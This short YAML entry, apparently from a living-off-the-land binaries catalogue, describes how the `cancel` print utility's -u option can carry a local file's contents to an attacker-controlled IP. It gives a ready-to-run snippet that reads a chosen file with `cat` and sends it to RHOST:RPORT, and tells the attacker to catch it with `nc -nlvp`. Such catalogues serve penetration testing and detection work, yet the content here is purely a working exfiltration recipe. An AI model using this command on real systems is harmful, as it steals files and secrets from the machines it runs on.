---
description: |
  `cancel` -u parameter can be used to transfer file contents to an attacker-controlled IP address.
functions:
  file-upload:
    - description: Send contents of a file to a TCP port. Run `nc -nlvp $RPORT > "file to save"` on the attacker system to capture the contents.
      code: |
        RHOST=attacker_ip
        RPORT=attacker_port
        LFILE=file_to_send
        cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
---
